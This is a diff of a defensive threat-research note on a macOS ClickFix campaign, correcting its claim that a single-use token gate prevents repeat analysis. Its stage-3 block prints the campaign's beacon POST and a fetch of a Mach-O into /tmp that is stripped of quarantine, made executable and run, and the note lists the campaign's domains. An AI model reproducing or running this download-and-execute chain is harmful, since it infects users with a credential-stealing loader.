@@ -1,6 +1,11 @@
-# One Shot: a ClickFix Chain That Cannot Be Analysed Twice
+# One Shot: What a Single-Use Gate Actually Protects
 
 ## What a single-use gate does to incident response — and why the page source could not tell this case apart from a legitimate one
+
+> **Corrected 2026-08-06.** This note was first published as *"a ClickFix Chain That
+> Cannot Be Analysed Twice"*. Two days later the chain was recovered end to end, and
+> that claim did not survive. The mechanism described below was real and correctly
+> observed; the conclusion drawn from it was too strong. See section 8.
 
 *First documentation, August 2026*
 
@@ -16,9 +21,9 @@ under their own account, so Gatekeeper, XProtect and download filters never get 
 
 The interesting part is not the technique, which is well documented. It is the **gate**:
 the first stage checks in with a control server using a per-victim token, and that token
-is honoured **exactly once**. Analyse it a second time and you get nothing. That single
-design choice reorders the whole investigation — and it defeated an attempt to collect a
-fresh sample roughly 70 minutes after a public report.
+is honoured **exactly once**. That single design choice reorders the whole investigation —
+not because it makes analysis impossible, but because it puts a clock on it. Section 8
+records how that distinction was learned the hard way.
 
 This note is the operational companion to [the Ad-Shield case](../2026-08-ad-shield-welt-de/),
 which reached the opposite conclusion from evidence that looked much the same. Read
@@ -49,6 +54,15 @@ fi
 hxxps://ferncurrent14[.]com/curl/<campaign-token>
 ```
 
+**Stage 3 — recovered 2026-08-06** (see section 8). Stage 2 fires a telemetry beacon the
+moment the victim pastes, then fetches a universal Mach-O:
+
+```
+POST hxxps://grove-89[.]com/api/metrics/run?event=pasted     headers: user, BuildID
+     hxxps://ferncurrent14[.]com/<id>/DANTE/update  ->  /tmp/helper
+     xattr -c ; chmod +x ; run
+```
+
 Three details worth keeping:
 
 - Stage 1 runs over **plain HTTP**; stage 2 is HTTPS. The gate check is readable on the
@@ -69,12 +83,14 @@ The control server answers `ok` once per token. A second request returns nothing
 For the operator this buys clean per-click telemetry and defeats sandbox re-execution. For
 anyone investigating, it means:
 
-- **Stage 2 cannot be retrieved retrospectively.** By the time the clipboard content is in
-  front of you, the token may already be spent — by the victim, or by your own first look.
-- **The payload is unfalsifiable after the fact.** We can describe stage 2's *address*
-  precisely. We cannot say what it did, because we never held it (see section 5).
-- **Re-analysis is not a fallback.** In ordinary web-malware work you can usually go back
-  and fetch the artefact again. Here the first contact is the only contact.
+- **A spent token stays spent.** By the time the clipboard content is in front of you, it
+  may already be burnt — by the victim, or by your own first look. Nothing brings that
+  particular token back.
+- **A captured one-liner is not transferable.** Handing it to a colleague, or to a
+  sandbox, gets nothing. What looks like a reproducible artefact is a single-use ticket.
+- **Retrospective analysis is impossible; repeat analysis is not.** This is the
+  distinction the first version of this note got wrong. A fresh visit to a live lure
+  issues a new token and the chain runs again — see section 8.
 
 The practical consequence is an inversion of the usual order. Normally: observe, form a
 hypothesis, then collect what the hypothesis needs. Against a single-use gate: **collect
@@ -142,9 +158,11 @@ creates a delisting problem for people who did nothing wrong. The distinction be
 
 ## 5. What this note does not establish
 
-- **The payload.** Stage 2 was never retrieved. Classifying it as an infostealer of a
-  particular family would be an inference from the shape of the chain, not a finding. We
-  do not make it.
+- **The payload.** Stage 2 and stage 3 were both recovered on 2026-08-06, but the stealer
+  itself was not: stage 3 is a loader whose payload sits encrypted in its own data section
+  and is decrypted only in memory. The family assessment — AMOS lineage — rests on chain
+  and binary characteristics, and is recorded as *assessed*, not confirmed. The
+  machine-readable feeds keep the family field at `unknown`.
 - **Attribution.** Nothing here identifies who is behind this. A domain's country code is
   not a location, a location is not a nationality, and rented infrastructure is not
   ownership. The edge-node identifiers in server responses describe the *requester's*
@@ -168,8 +186,12 @@ Full, machine-readable, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).
 ```
 enter-pverif-code.info      stage-1 gate / click telemetry (plain HTTP)
 makeverizyjar.info          sibling gate, same hosting AS
-ferncurrent14.com           stage-2 loader host
+ferncurrent14.com           stage-2 and stage-3 loader host
+grove-89.com                paste-conversion beacon (added 2026-08-06)
 ```
+
+`grove-89.com` had no public scan history at all when it was found — it fires before the
+payload downloads, which makes it the earliest network signal in the chain.
 
 **The gates are not behind the proxy.** Re-checked on 2026-08-06 against two independent
 resolvers: both gate domains use Cloudflare nameservers but DNS-only `A` records, leaving
@@ -238,7 +260,70 @@ infrastructure behaves.
 
 ---
 
-## 8. Handling
+## 8. Correction (2026-08-06): the payload was recoverable after all
+
+The original argument was that a single-use gate inverts the order of an investigation:
+the token burns on first contact, so the payload is gone before you know you wanted it.
+
+Two days later the full chain was recovered — stage 2, stage 3, and the Mach-O.
+
+**The token is single-use. The lure is not.** A second visit to a still-serving lure page
+issues a fresh token, and the chain runs again from the top. What the gate prevents is
+*retrospective* analysis: you cannot return to a token you have spent, and you cannot hand
+a captured one-liner to someone else and expect it to work. Everything is recoverable
+going forward; nothing is recoverable backwards.
+
+So the correct statement is not "this cannot be analysed twice" but:
+
+> **The evidence has a shelf life, and remediation shortens it.**
+
+### The uncomfortable part
+
+That deadline runs against the notification work. Every hour spent getting a compromised
+site cleaned is an hour closer to losing the sample — and the sample is what decides
+whether a notification can name a malware family at all, which is what recipients act on.
+
+The original note treated this as a sequencing problem to be optimised. It is not. It is a
+conflict between two duties, and the resolution is not clever ordering but parallelism:
+the capture environment has to be standing *before* the first notification goes out, so
+the two tracks do not compete for the same window. In this case they did compete, and the
+capture happened anyway. That was luck. Designing on the assumption that infrastructure
+will outlive the response is a mistake.
+
+### What the sample was worth
+
+- Stage 3 turned out to be a **loader, not the stealer** — sixteen imports, a 69,632-byte
+  encrypted blob at entropy 7.997, and `mlock`/`munlock` to keep the decrypted payload out
+  of swap. That is an anti-forensics measure aimed at exactly the kind of post-incident
+  analysis a defender would attempt, and it was not visible from the scripts.
+- A **conversion beacon** appeared in stage 2: a POST fired the moment the victim pastes,
+  before anything is downloaded. That is a detection opportunity *ahead* of the
+  compromise, and it existed nowhere in the artefacts captured from the first encounter.
+- Two non-standard request headers carry campaign and build identifiers.
+
+On that last point the first draft of the technical analysis overreached, and it is worth
+recording why: it listed the observed header *values* as indicators, on the reasoning that
+they come from the builder and would therefore survive domain rotation. That reasoning is
+plausible and completely unevidenced — there is one observation. The published indicators
+name the headers; the values stay in the analysis, where a reader can see they were seen
+once.
+
+### Revised guidance
+
+1. Treat a single-use gate as a **clock**, not a lock.
+2. Have the capture environment ready before notifying anyone, not after.
+3. **Do not infer capability from delivery.** From the scripts this looked like a
+   straightforward download-and-run. It was a self-decrypting in-memory loader — a
+   materially different thing to put in a report.
+4. When a claim turns out to be too strong, amend the note rather than quietly dropping
+   it. The mechanism here was real and correctly observed. Only the conclusion was wrong.
+
+Full technical detail, including what was independently re-verified against the sample:
+[macos-threat-tracking, campaign DANTE](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/payload_analysis.md).
+
+---
+
+## 9. Handling
 
 The affected school was notified the same day, unpaid and without commercial interest, with
 remediation steps and a suggested notice for parents. **The site is deliberately not named
